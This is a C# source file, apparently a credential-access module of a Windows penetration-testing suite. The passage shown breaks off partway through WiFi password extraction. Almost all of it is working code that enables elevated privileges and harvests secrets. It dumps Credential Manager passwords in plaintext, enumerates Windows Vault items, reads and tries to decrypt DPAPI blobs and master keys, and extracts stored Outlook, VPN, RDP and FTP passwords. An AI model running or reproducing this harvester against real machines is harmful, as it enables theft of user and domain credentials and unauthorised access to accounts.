using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using System.ComponentModel;
using EliteWindowsPentestSuite.Core;
using EliteWindowsPentestSuite.Models.Results;
using Microsoft.Extensions.Logging;

namespace EliteWindowsPentestSuite.Modules.CredentialAccess
{
    public class CredentialStore
    {
        private readonly ILogger _logger;
        private readonly PrivilegeManager _privilegeManager;
        private readonly CryptographyEngine _cryptoEngine;

        private const uint CRED_TYPE_GENERIC = 1;
        private const uint CRED_TYPE_DOMAIN_PASSWORD = 2;
        private const uint CRED_TYPE_DOMAIN_CERTIFICATE = 3;
        private const uint CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4;
        private const uint CRED_TYPE_GENERIC_CERTIFICATE = 5;
        private const uint CRED_TYPE_DOMAIN_EXTENDED = 6;
        private const uint CRED_PERSIST_SESSION = 1;
        private const uint CRED_PERSIST_LOCAL_MACHINE = 2;
        private const uint CRED_PERSIST_ENTERPRISE = 3;

        public CredentialStore(ILogger logger, PrivilegeManager privilegeManager, CryptographyEngine cryptoEngine)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _privilegeManager = privilegeManager ?? throw new ArgumentNullException(nameof(privilegeManager));
            _cryptoEngine = cryptoEngine ?? throw new ArgumentNullException(nameof(cryptoEngine));
        }

        public async Task<CredentialStoreResult> ExtractAsync()
        {
            var result = new CredentialStoreResult
            {
                StartTime = DateTime.UtcNow,
                ExecutionId = Guid.NewGuid().ToString()
            };

            try
            {
                _logger.LogInformation($"Starting credential store extraction {result.ExecutionId}");

                await ValidateAccessAsync(result);
                if (!result.CanProceed) return result;

                await ExtractWindowsCredentialManagerAsync(result);
                await ExtractGenericCredentialsAsync(result);
                await ExtractDomainCredentialsAsync(result);
                await ExtractCertificateCredentialsAsync(result);
                await ExtractWebCredentialsAsync(result);
                await ExtractVaultCredentialsAsync(result);
                await ExtractDPAPICredentialsAsync(result);
                await ExtractMasterKeyCredentialsAsync(result);
                await ExtractStoredPasswordsAsync(result);

                result.TotalCredentialsFound = result.WindowsCredentials.Count +
                                             result.GenericCredentials.Count +
                                             result.DomainCredentials.Count +
                                             result.CertificateCredentials.Count +
                                             result.WebCredentials.Count +
                                             result.VaultCredentials.Count +
                                             result.DPAPICredentials.Count +
                                             result.StoredPasswords.Count;

                result.IsSuccessful = result.TotalCredentialsFound > 0;
                result.CompletionTime = DateTime.UtcNow;
                result.Duration = result.CompletionTime - result.StartTime;

                _logger.LogInformation($"Credential store extraction {result.ExecutionId} completed: {result.TotalCredentialsFound} credentials");
            }
            catch (Exception ex)
            {
                result.ErrorMessage = ex.Message;
                result.Exception = ex;
                _logger.LogError(ex, $"Credential store extraction {result.ExecutionId} failed");
            }

            return result;
        }

        private async Task ValidateAccessAsync(CredentialStoreResult result)
        {
            result.IsElevated = _privilegeManager.IsProcessElevated();
            result.HasBackupPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeBackupPrivilege");
            result.HasRestorePrivilege = await _privilegeManager.EnablePrivilegeAsync("SeRestorePrivilege");
            result.HasSecurityPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeSecurityPrivilege");

            result.CanAccessCredentialManager = await TestCredentialManagerAccessAsync();
            result.CanAccessVault = await TestVaultAccessAsync();
            result.CanAccessDPAPI = await TestDPAPIAccessAsync();

            result.CanProceed = result.CanAccessCredentialManager || result.CanAccessVault || result.CanAccessDPAPI;

            if (!result.CanProceed)
            {
                result.ErrorMessage = "No accessible credential stores found";
            }
        }

        private async Task<bool> TestCredentialManagerAccessAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    IntPtr credPtr;
                    uint count;
                    return NativeMethods.CredEnumerate(null, 0, out count, out credPtr);
                }
                catch
                {
                    return false;
                }
            });
        }

        private async Task<bool> TestVaultAccessAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    var result = NativeMethods.VaultEnumerateVaults(0, out int vaultCount, out IntPtr vaultGuids);
                    return result == 0 && vaultCount > 0;
                }
                catch
                {
                    return false;
                }
            });
        }

        private async Task<bool> TestDPAPIAccessAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    var testData = Encoding.UTF8.GetBytes("test");
                    var encryptedData = new NativeMethods.DATA_BLOB();

                    var inputData = new NativeMethods.DATA_BLOB
                    {
                        cbData = (uint)testData.Length,
                        pbData = Marshal.AllocHGlobal(testData.Length)
                    };

                    Marshal.Copy(testData, 0, inputData.pbData, testData.Length);

                    var success = NativeMethods.CryptProtectData(ref inputData, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref encryptedData);

                    if (encryptedData.pbData != IntPtr.Zero)
                        NativeMethods.LocalFree(encryptedData.pbData);
                    Marshal.FreeHGlobal(inputData.pbData);

                    return success;
                }
                catch
                {
                    return false;
                }
            });
        }

        private async Task ExtractWindowsCredentialManagerAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateCredentialManagerCredentialsAsync();
                result.WindowsCredentials.AddRange(credentials);
                result.WindowsCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} Windows Credential Manager credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting Windows Credential Manager credentials");
                result.ProcessingErrors.Add($"Windows Credential Manager: {ex.Message}");
            }
        }

        private async Task<List<WindowsCredential>> EnumerateCredentialManagerCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<WindowsCredential>();

                try
                {
                    IntPtr credPtr;
                    uint count;

                    if (NativeMethods.CredEnumerate(null, 0, out count, out credPtr))
                    {
                        var credentialPtrs = new IntPtr[count];
                        Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                        foreach (var ptr in credentialPtrs)
                        {
                            try
                            {
                                var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                                var credential = ConvertToWindowsCredential(cred);
                                if (credential != null)
                                {
                                    credentials.Add(credential);
                                }
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, "Error converting credential");
                            }
                        }

                        NativeMethods.CredFree(credPtr);
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating credential manager credentials");
                }

                return credentials;
            });
        }

        private WindowsCredential ConvertToWindowsCredential(NativeMethods.CREDENTIAL cred)
        {
            try
            {
                var credential = new WindowsCredential
                {
                    TargetName = Marshal.PtrToStringUni(cred.TargetName),
                    Type = GetCredentialTypeName(cred.Type),
                    UserName = Marshal.PtrToStringUni(cred.UserName),
                    Comment = Marshal.PtrToStringUni(cred.Comment),
                    LastWritten = DateTime.FromFileTime(cred.LastWritten),
                    Persist = GetPersistTypeName(cred.Persist),
                    Flags = cred.Flags
                };

                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                {
                    var passwordBytes = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);

                    if (IsUnicodeText(passwordBytes))
                    {
                        credential.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                    }
                    else
                    {
                        credential.Password = Encoding.UTF8.GetString(passwordBytes).TrimEnd('\0');
                    }
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error converting credential structure");
                return null;
            }
        }

        private async Task ExtractGenericCredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateGenericCredentialsAsync();
                result.GenericCredentials.AddRange(credentials);
                result.GenericCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} generic credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting generic credentials");
                result.ProcessingErrors.Add($"Generic credentials: {ex.Message}");
            }
        }

        private async Task<List<GenericCredential>> EnumerateGenericCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<GenericCredential>();

                try
                {
                    IntPtr credPtr;
                    uint count;

                    if (NativeMethods.CredEnumerate(null, 0, out count, out credPtr))
                    {
                        var credentialPtrs = new IntPtr[count];
                        Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                        foreach (var ptr in credentialPtrs)
                        {
                            try
                            {
                                var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                                if (cred.Type == CRED_TYPE_GENERIC)
                                {
                                    var credential = ConvertToGenericCredential(cred);
                                    if (credential != null)
                                    {
                                        credentials.Add(credential);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, "Error converting generic credential");
                            }
                        }

                        NativeMethods.CredFree(credPtr);
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating generic credentials");
                }

                return credentials;
            });
        }

        private GenericCredential ConvertToGenericCredential(NativeMethods.CREDENTIAL cred)
        {
            try
            {
                var credential = new GenericCredential
                {
                    TargetName = Marshal.PtrToStringUni(cred.TargetName),
                    UserName = Marshal.PtrToStringUni(cred.UserName),
                    Comment = Marshal.PtrToStringUni(cred.Comment),
                    LastWritten = DateTime.FromFileTime(cred.LastWritten),
                    ApplicationName = ExtractApplicationName(Marshal.PtrToStringUni(cred.TargetName))
                };

                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                {
                    var dataBytes = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, dataBytes, 0, (int)cred.CredentialBlobSize);
                    credential.Data = Convert.ToBase64String(dataBytes);

                    if (IsUnicodeText(dataBytes))
                    {
                        credential.DecodedData = Encoding.Unicode.GetString(dataBytes).TrimEnd('\0');
                    }
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error converting generic credential structure");
                return null;
            }
        }

        private async Task ExtractDomainCredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateDomainCredentialsAsync();
                result.DomainCredentials.AddRange(credentials);
                result.DomainCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} domain credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting domain credentials");
                result.ProcessingErrors.Add($"Domain credentials: {ex.Message}");
            }
        }

        private async Task<List<DomainCredential>> EnumerateDomainCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<DomainCredential>();

                try
                {
                    IntPtr credPtr;
                    uint count;

                    if (NativeMethods.CredEnumerate(null, 0, out count, out credPtr))
                    {
                        var credentialPtrs = new IntPtr[count];
                        Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                        foreach (var ptr in credentialPtrs)
                        {
                            try
                            {
                                var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                                if (cred.Type == CRED_TYPE_DOMAIN_PASSWORD || cred.Type == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD)
                                {
                                    var credential = ConvertToDomainCredential(cred);
                                    if (credential != null)
                                    {
                                        credentials.Add(credential);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, "Error converting domain credential");
                            }
                        }

                        NativeMethods.CredFree(credPtr);
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating domain credentials");
                }

                return credentials;
            });
        }

        private DomainCredential ConvertToDomainCredential(NativeMethods.CREDENTIAL cred)
        {
            try
            {
                var targetName = Marshal.PtrToStringUni(cred.TargetName);
                var userName = Marshal.PtrToStringUni(cred.UserName);

                var credential = new DomainCredential
                {
                    TargetName = targetName,
                    UserName = userName,
                    DomainName = ExtractDomainName(userName),
                    AccountName = ExtractAccountName(userName),
                    Comment = Marshal.PtrToStringUni(cred.Comment),
                    LastWritten = DateTime.FromFileTime(cred.LastWritten),
                    IsVisible = cred.Type == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD
                };

                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                {
                    var passwordBytes = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                    credential.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error converting domain credential structure");
                return null;
            }
        }

        private async Task ExtractCertificateCredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateCertificateCredentialsAsync();
                result.CertificateCredentials.AddRange(credentials);
                result.CertificateCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} certificate credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting certificate credentials");
                result.ProcessingErrors.Add($"Certificate credentials: {ex.Message}");
            }
        }

        private async Task<List<CertificateCredential>> EnumerateCertificateCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<CertificateCredential>();

                try
                {
                    IntPtr credPtr;
                    uint count;

                    if (NativeMethods.CredEnumerate(null, 0, out count, out credPtr))
                    {
                        var credentialPtrs = new IntPtr[count];
                        Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                        foreach (var ptr in credentialPtrs)
                        {
                            try
                            {
                                var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                                if (cred.Type == CRED_TYPE_DOMAIN_CERTIFICATE || cred.Type == CRED_TYPE_GENERIC_CERTIFICATE)
                                {
                                    var credential = ConvertToCertificateCredential(cred);
                                    if (credential != null)
                                    {
                                        credentials.Add(credential);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, "Error converting certificate credential");
                            }
                        }

                        NativeMethods.CredFree(credPtr);
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating certificate credentials");
                }

                return credentials;
            });
        }

        private CertificateCredential ConvertToCertificateCredential(NativeMethods.CREDENTIAL cred)
        {
            try
            {
                var credential = new CertificateCredential
                {
                    TargetName = Marshal.PtrToStringUni(cred.TargetName),
                    UserName = Marshal.PtrToStringUni(cred.UserName),
                    Comment = Marshal.PtrToStringUni(cred.Comment),
                    LastWritten = DateTime.FromFileTime(cred.LastWritten),
                    CertificateType = cred.Type == CRED_TYPE_DOMAIN_CERTIFICATE ? "Domain" : "Generic"
                };

                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                {
                    var certBytes = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, certBytes, 0, (int)cred.CredentialBlobSize);
                    credential.CertificateData = Convert.ToBase64String(certBytes);
                    credential.CertificateThumbprint = ExtractCertificateThumbprint(certBytes);
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error converting certificate credential structure");
                return null;
            }
        }

        private async Task ExtractWebCredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateWebCredentialsAsync();
                result.WebCredentials.AddRange(credentials);
                result.WebCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} web credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting web credentials");
                result.ProcessingErrors.Add($"Web credentials: {ex.Message}");
            }
        }

        private async Task<List<WebCredential>> EnumerateWebCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<WebCredential>();

                try
                {
                    var webFilters = new[] { "http*", "https*", "ftp*" };

                    foreach (var filter in webFilters)
                    {
                        try
                        {
                            IntPtr credPtr;
                            uint count;

                            if (NativeMethods.CredEnumerate(filter, 0, out count, out credPtr))
                            {
                                var credentialPtrs = new IntPtr[count];
                                Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                                foreach (var ptr in credentialPtrs)
                                {
                                    try
                                    {
                                        var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                                        var credential = ConvertToWebCredential(cred);
                                        if (credential != null && !credentials.Any(c => c.Url == credential.Url && c.UserName == credential.UserName))
                                        {
                                            credentials.Add(credential);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        _logger.LogError(ex, "Error converting web credential");
                                    }
                                }

                                NativeMethods.CredFree(credPtr);
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogError(ex, $"Error enumerating web credentials with filter: {filter}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating web credentials");
                }

                return credentials;
            });
        }

        private WebCredential ConvertToWebCredential(NativeMethods.CREDENTIAL cred)
        {
            try
            {
                var targetName = Marshal.PtrToStringUni(cred.TargetName);

                var credential = new WebCredential
                {
                    Url = targetName,
                    UserName = Marshal.PtrToStringUni(cred.UserName),
                    Comment = Marshal.PtrToStringUni(cred.Comment),
                    LastWritten = DateTime.FromFileTime(cred.LastWritten),
                    Protocol = ExtractProtocol(targetName),
                    Domain = ExtractDomainFromUrl(targetName)
                };

                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                {
                    var passwordBytes = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                    credential.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error converting web credential structure");
                return null;
            }
        }

        private async Task ExtractVaultCredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateVaultCredentialsAsync();
                result.VaultCredentials.AddRange(credentials);
                result.VaultCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} vault credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting vault credentials");
                result.ProcessingErrors.Add($"Vault credentials: {ex.Message}");
            }
        }

        private async Task<List<VaultCredential>> EnumerateVaultCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<VaultCredential>();

                try
                {
                    IntPtr vaultGuids;
                    int vaultCount;

                    if (NativeMethods.VaultEnumerateVaults(0, out vaultCount, out vaultGuids) == 0)
                    {
                        var guids = new Guid[vaultCount];
                        var guidSize = Marshal.SizeOf<Guid>();

                        for (int i = 0; i < vaultCount; i++)
                        {
                            var guidPtr = IntPtr.Add(vaultGuids, i * guidSize);
                            guids[i] = Marshal.PtrToStructure<Guid>(guidPtr);
                        }

                        foreach (var guid in guids)
                        {
                            try
                            {
                                var vaultCredentials = EnumerateVaultItems(guid);
                                credentials.AddRange(vaultCredentials);
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, $"Error enumerating vault {guid}");
                            }
                        }

                        NativeMethods.VaultFree(vaultGuids);
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating vaults");
                }

                return credentials;
            });
        }

        private List<VaultCredential> EnumerateVaultItems(Guid vaultGuid)
        {
            var credentials = new List<VaultCredential>();

            try
            {
                IntPtr vaultHandle;
                if (NativeMethods.VaultOpenVault(ref vaultGuid, 0, out vaultHandle) == 0)
                {
                    IntPtr vaultItems;
                    int itemCount;

                    if (NativeMethods.VaultEnumerateItems(vaultHandle, 512, out itemCount, out vaultItems) == 0)
                    {
                        var itemSize = Marshal.SizeOf<NativeMethods.VAULT_ITEM>();

                        for (int i = 0; i < itemCount; i++)
                        {
                            try
                            {
                                var itemPtr = IntPtr.Add(vaultItems, i * itemSize);
                                var item = Marshal.PtrToStructure<NativeMethods.VAULT_ITEM>(itemPtr);

                                var credential = ConvertToVaultCredential(item, vaultGuid);
                                if (credential != null)
                                {
                                    credentials.Add(credential);
                                }
                            }
                            catch (Exception ex)
                            {
                                _logger.LogError(ex, $"Error converting vault item {i}");
                            }
                        }

                        NativeMethods.VaultFree(vaultItems);
                    }

                    NativeMethods.VaultCloseVault(ref vaultHandle);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error enumerating vault items for {vaultGuid}");
            }

            return credentials;
        }

        private VaultCredential ConvertToVaultCredential(NativeMethods.VAULT_ITEM item, Guid vaultGuid)
        {
            try
            {
                var credential = new VaultCredential
                {
                    VaultId = vaultGuid.ToString(),
                    SchemaId = item.SchemaId.ToString(),
                    FriendlyName = Marshal.PtrToStringUni(item.FriendlyName),
                    LastModified = DateTime.FromFileTime(item.LastModified)
                };

                if (item.Resource != IntPtr.Zero)
                {
                    var resource = Marshal.PtrToStructure<NativeMethods.VAULT_ELEMENT_DATA>(item.Resource);
                    credential.Resource = ExtractVaultElementData(resource);
                }

                if (item.Identity != IntPtr.Zero)
                {
                    var identity = Marshal.PtrToStructure<NativeMethods.VAULT_ELEMENT_DATA>(item.Identity);
                    credential.Identity = ExtractVaultElementData(identity);
                }

                if (item.Authenticator != IntPtr.Zero)
                {
                    var authenticator = Marshal.PtrToStructure<NativeMethods.VAULT_ELEMENT_DATA>(item.Authenticator);
                    credential.Authenticator = ExtractVaultElementData(authenticator);
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error converting vault credential structure");
                return null;
            }
        }

        private async Task ExtractDPAPICredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateDPAPICredentialsAsync();
                result.DPAPICredentials.AddRange(credentials);
                result.DPAPICredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} DPAPI credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting DPAPI credentials");
                result.ProcessingErrors.Add($"DPAPI credentials: {ex.Message}");
            }
        }

        private async Task<List<DPAPICredential>> EnumerateDPAPICredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<DPAPICredential>();

                try
                {
                    var dpApiPaths = GetDPAPISearchPaths();

                    foreach (var path in dpApiPaths)
                    {
                        try
                        {
                            if (System.IO.Directory.Exists(path))
                            {
                                var files = System.IO.Directory.GetFiles(path, "*", System.IO.SearchOption.AllDirectories);

                                foreach (var file in files)
                                {
                                    try
                                    {
                                        var credential = ProcessDPAPIFile(file);
                                        if (credential != null)
                                        {
                                            credentials.Add(credential);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        _logger.LogError(ex, $"Error processing DPAPI file: {file}");
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogError(ex, $"Error searching DPAPI path: {path}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating DPAPI credentials");
                }

                return credentials;
            });
        }

        private List<string> GetDPAPISearchPaths()
        {
            var paths = new List<string>();

            try
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                paths.AddRange(new[]
                {
                    System.IO.Path.Combine(appData, "Microsoft", "Protect"),
                    System.IO.Path.Combine(localAppData, "Microsoft", "Protect"),
                    System.IO.Path.Combine(userProfile, "AppData", "Roaming", "Microsoft", "Protect"),
                    System.IO.Path.Combine(userProfile, "AppData", "Local", "Microsoft", "Protect"),
                    @"C:\ProgramData\Microsoft\Protect",
                    @"C:\Windows\System32\Microsoft\Protect"
                });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error getting DPAPI search paths");
            }

            return paths;
        }

        private DPAPICredential ProcessDPAPIFile(string filePath)
        {
            try
            {
                var fileInfo = new System.IO.FileInfo(filePath);
                if (fileInfo.Length == 0 || fileInfo.Length > 1024 * 1024) return null;

                var data = System.IO.File.ReadAllBytes(filePath);

                var credential = new DPAPICredential
                {
                    FilePath = filePath,
                    FileSize = fileInfo.Length,
                    CreationTime = fileInfo.CreationTime,
                    LastWriteTime = fileInfo.LastWriteTime,
                    EncryptedData = Convert.ToBase64String(data),
                    MasterKeyGuid = ExtractMasterKeyGuid(data),
                    Description = ExtractDPAPIDescription(data)
                };

                try
                {
                    credential.DecryptedData = _cryptoEngine.DecryptDPAPIData(data).Result;
                    credential.IsDecrypted = !string.IsNullOrEmpty(credential.DecryptedData);
                }
                catch
                {
                    credential.IsDecrypted = false;
                }

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error processing DPAPI file: {filePath}");
                return null;
            }
        }

        private async Task ExtractMasterKeyCredentialsAsync(CredentialStoreResult result)
        {
            try
            {
                var credentials = await EnumerateMasterKeyCredentialsAsync();
                result.MasterKeyCredentials.AddRange(credentials);
                result.MasterKeyCredentialsFound = credentials.Count;

                _logger.LogInformation($"Found {credentials.Count} master key credentials");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting master key credentials");
                result.ProcessingErrors.Add($"Master key credentials: {ex.Message}");
            }
        }

        private async Task<List<MasterKeyCredential>> EnumerateMasterKeyCredentialsAsync()
        {
            return await Task.Run(() =>
            {
                var credentials = new List<MasterKeyCredential>();

                try
                {
                    var masterKeyPaths = GetMasterKeyPaths();

                    foreach (var path in masterKeyPaths)
                    {
                        try
                        {
                            if (System.IO.Directory.Exists(path))
                            {
                                var files = System.IO.Directory.GetFiles(path, "*", System.IO.SearchOption.TopDirectoryOnly);

                                foreach (var file in files)
                                {
                                    try
                                    {
                                        var credential = ProcessMasterKeyFile(file);
                                        if (credential != null)
                                        {
                                            credentials.Add(credential);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        _logger.LogError(ex, $"Error processing master key file: {file}");
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogError(ex, $"Error searching master key path: {path}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating master key credentials");
                }

                return credentials;
            });
        }

        private List<string> GetMasterKeyPaths()
        {
            var paths = new List<string>();

            try
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var protectPath = System.IO.Path.Combine(userProfile, "AppData", "Roaming", "Microsoft", "Protect");

                if (System.IO.Directory.Exists(protectPath))
                {
                    var sidDirs = System.IO.Directory.GetDirectories(protectPath);
                    foreach (var sidDir in sidDirs)
                    {
                        paths.Add(sidDir);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error getting master key paths");
            }

            return paths;
        }

        private MasterKeyCredential ProcessMasterKeyFile(string filePath)
        {
            try
            {
                var fileInfo = new System.IO.FileInfo(filePath);
                if (fileInfo.Length == 0) return null;

                var data = System.IO.File.ReadAllBytes(filePath);
                var fileName = System.IO.Path.GetFileName(filePath);

                var credential = new MasterKeyCredential
                {
                    FilePath = filePath,
                    MasterKeyGuid = fileName,
                    FileSize = fileInfo.Length,
                    CreationTime = fileInfo.CreationTime,
                    LastWriteTime = fileInfo.LastWriteTime,
                    EncryptedData = Convert.ToBase64String(data),
                    Version = ExtractMasterKeyVersion(data),
                    Algorithm = ExtractMasterKeyAlgorithm(data)
                };

                return credential;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error processing master key file: {filePath}");
                return null;
            }
        }

        private async Task ExtractStoredPasswordsAsync(CredentialStoreResult result)
        {
            try
            {
                var passwords = await EnumerateStoredPasswordsAsync();
                result.StoredPasswords.AddRange(passwords);
                result.StoredPasswordsFound = passwords.Count;

                _logger.LogInformation($"Found {passwords.Count} stored passwords");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting stored passwords");
                result.ProcessingErrors.Add($"Stored passwords: {ex.Message}");
            }
        }

        private async Task<List<StoredPassword>> EnumerateStoredPasswordsAsync()
        {
            return await Task.Run(() =>
            {
                var passwords = new List<StoredPassword>();

                try
                {
                    var passwordSources = new Dictionary<string, Func<List<StoredPassword>>>
                    {
                        ["Outlook"] = ExtractOutlookPasswords,
                        ["WiFi"] = ExtractWiFiPasswords,
                        ["VPN"] = ExtractVPNPasswords,
                        ["RDP"] = ExtractRDPPasswords,
                        ["FTP"] = ExtractFTPPasswords
                    };

                    foreach (var source in passwordSources)
                    {
                        try
                        {
                            var sourcePasswords = source.Value();
                            foreach (var password in sourcePasswords)
                            {
                                password.Source = source.Key;
                                passwords.Add(password);
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogError(ex, $"Error extracting {source.Key} passwords");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error enumerating stored passwords");
                }

                return passwords;
            });
        }

        private List<StoredPassword> ExtractOutlookPasswords()
        {
            var passwords = new List<StoredPassword>();

            try
            {
                IntPtr credPtr;
                uint count;
                var filter = "Microsoft_OC1";

                if (NativeMethods.CredEnumerate(filter, 0, out count, out credPtr))
                {
                    var credentialPtrs = new IntPtr[count];
                    Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                    foreach (var ptr in credentialPtrs)
                    {
                        var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                        var password = new StoredPassword
                        {
                            Application = "Microsoft Outlook",
                            Target = Marshal.PtrToStringUni(cred.TargetName),
                            Username = Marshal.PtrToStringUni(cred.UserName),
                            LastWritten = DateTime.FromFileTime(cred.LastWritten)
                        };

                        if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                        {
                            var passwordBytes = new byte[cred.CredentialBlobSize];
                            Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                            password.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                        }

                        passwords.Add(password);
                    }

                    NativeMethods.CredFree(credPtr);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting Outlook passwords");
            }

            return passwords;
        }

        private List<StoredPassword> ExtractWiFiPasswords()
        {
            var passwords = new List<StoredPassword>();

            try
            {
                var profiles = NativeMethods.GetWiFiProfiles();
                foreach (var profile in profiles)
                {
                    try
                    {
                        var profileXml = NativeMethods.GetWiFiProfileXml(profile);
                        if (!string.IsNullOrEmpty(profileXml))
                        {
